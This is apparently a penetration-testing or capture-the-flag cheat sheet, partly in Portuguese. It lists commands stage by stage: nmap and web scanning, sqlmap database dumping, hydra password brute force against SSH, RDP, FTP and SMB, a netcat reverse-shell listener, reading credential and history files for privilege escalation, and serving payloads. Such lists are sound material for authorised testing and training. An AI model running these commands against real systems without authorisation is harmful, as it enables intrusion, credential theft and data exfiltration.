# 1° Network Scan Nmap 

$ sudo nmap 10.0.0.0/24 -oN report-nmap.txt

$ sudo nmap -Pn -p- -sV 10.0.0.123 -oN report-all-ports-nmap.txt

$ sudo nmap -Pn -A 10.0.0.123 -oN report-agressive-nmap.txt

$ sudo nmap -Pn -sV -sC -O 10.0.0.123 -oN report-basic-nmap.txt

$ sudo nmap -Pn --script vuln 10.0.0.123 -oN report-all-vulns.txt

$ sudo nmap -Pn -p 80 --script http-enum,http-robots.txt 10.0.0.123

$ sudo nmap -Pn -p 80 --script http-sql-injection 10.0.0.123

$ sudo nmap -Pn -p 80 --script http-passwd --script-args http-passwd.root=/test/ 10.0.0.123

$ sudo nmap -Pn -p 80 --script http-vuln-* 10.0.0.123

$ sudo nmap -Pn -p 21 --script ftp-anon 10.0.0.123

$ sudo nmap -Pn -p 21 --script ftp-proftpd-backdoor 10.0.0.123 [ProFTPD 1.3.3c]

$ sudo nmap -Pn -p 21 --script ftp-vsftpd-backdoor 10.0.0.123 [vsFTPd 2.3.4]

$ sudo nmap -Pn -p 111 --script nfs-ls,nfs-statfs,nfs-showmount 10.0.0.123

$ sudo nmap -Pn -p 445 --script smb-enum-shares,smb-enum-users 10.0.0.123

$ sudo nmap -Pn -p 445 --script smb-vuln-* 10.0.0.123

https://nmap.org/book/man.html

# 2° Web-Server Scan Dirb/Gobuster/ffuf/Nikto

$ dirb http://example.com -o dirb-report.txt

$ dirb http://example.com -X .txt -w /usr/share/dirb/wordlists/small.txt -o dir-report.txt

$ dirb http://example.com:8080 -w /usr/share/dirb/wordlists/big.txt -u user:password

$ gobuster dir -u http://example.com -w /usr/share/dirb/wordlists/small.txt -o dir-report.txt

$ gobuster dir -u http://example.com -w -x php,txt /usr/share/dirb/wordlists/small.txt -o dir-report.txt

$ gobuster dir -u http://example.com -w /usr/share/dirb/wordlists/big.txt -t 4 --delay 1s

$ gobuster dir -u http://example.com -x php,html,js,txt,zip -w /usr/share/dirb/wordlists/big.txt

$ gobuster dns -q -r 8.8.8.8 -d example.com -w /Wordlists/subdomains-top1million-5000.txt

$ gobuster vhost -u https://example.com -t 50 -w /wordlists/subdomains-top1million-5000.txt -o subdom.report.txt

$ ffuf -u http://example.com/FUZZ -w Wordlists/dir-list-2.3-medium.txt

$ ffuf -u http://example.com/FUZZ -w Wordlists/dir-list-2.3-medium.txt -o results.json -of json

$ ffuf -u http://example.com/FUZZ -w Wordlists/dir-list-2.3-medium.txt -fc 403

$ ffuf -u http://example.com/FUZZ -w Wordlists/dir-list-2.3-medium.txt --recursion-depth 2

$ ffuf -u http://example.com/FUZZ.txt -w Wordlists/dir-list-2.3-medium.txt -fc 403 -fs 292

$ ffuf -u http://example.com/FUZZ -w Wordlists/list-name.txt -X POST -d "username=FUZZ&password=pass"

$ ffuf -u http://FUZZ.example.com -w Wordlists/list-subdomains.txt -H "Host: FUZZ.example.com"

$ nikto -h http://example.com -o report.html

$ nikto -h http://example.com:8080/ -id user:password

# 3° Web-Site-DB Scan SQLMap/Burp Suite/ZAP

$ sqlmap -u http://example.com/login.php --forms --dump

$ sqlmap -u http://example.com/listproducts.php?cat=1 –-dbs

$ sqlmap -u  http://example.com/listproducts.php?cat=1 –-dbs -D products –-tables

Burp Suite > Proxy > Intercept > Open Browser > Intercept on

Burp Suite > Intruder > Sniper attack > Positions Add > Payload Type = Simple list

# 4° Password Brute Force

$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"

$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ftp

$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ssh

$ hydra -f -L name-list.txt -P /usr/share/wordlists/rockyou.txt Target_IP ssh

$ hydra -L name-list.txt -P /usr/share/wordlists/rockyou.txt Target_IP -s 2222 ssh

$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP smb

$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP rdp

$ hydra -L name-list.txt -P /usr/share/wordlists/rockyou.txt Target_IP -s 33389 rdp

$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-get

$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP -s 8080 http-get

https://github.com/danielmiessler/SecLists

https://weakpass.com

https://wordlists.assetnote.io

# 5° Scan SMB

$ enum4linux -a Target_IP

# 6° Gain Access

http://example.com/login [Exibir código fonte da página]

http://example.com/ftp

http://example/upload

http://example.com/hiden/dir

http://example.com/robots.txt

$ ftp Target_IP [user anonymous]

$ ssh user@Target_IP

$ ssh -i id_rsa user@Target_IP

$ ssh -oHostKeyAlgorithms=+ssh-rsa user@Target_IP

$ sudo mount -o rw Target_IP:/backup /tmp/dir-target

$ sudo mount -t cifs -o username=user_name //Target_IP/share_name /mnt/dir-target

$ smbclient //Target_IP/shared/dir

# 7° Reverse Shell

Execute no terminal shell do Kali Linux $nc -lvnp 6666

https://www.sans.org/posters/netcat-cheat-sheet

Implante o Payload de Shell Reverso [php, python, nc]

https://github.com/pentestmonkey/php-reverse-shell

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Spawn a tty shell

python3 -c 'import pty; pty.spawn("/bin/bash")'

# 8° Search Priv-Esc

$ cat /etc/proc/version

$ cat /etc/issue

$ cat /etc/passwd

$ cat /etc/crontab

$ cat /etc/exports

$ cat ~/.*history | less

$ id

$ ls -la /

$ ls -la /home

$ ls -la /home/user/.ssh

$ sudo -l

$ getcap -r / 2>/dev/null

$ find / -perm -o w -type d 2>/dev/null

$ find / -perm -u=s -type f 2>/dev/null

$ find / -name perl* python* gcc* 2>/dev/nul

$ find /home -name flag*.txt

$ find / -user "www-data" -name "*" 2>/dev/null

https://gtfobins.github.io

https://www.exploit-db.com

# 9° Deploy Payload

$ python2 -m SimpleHTTPServer 8000

$ python3 -m http-server 8000

$ scp payload.sh user@Target_IP:/home/user
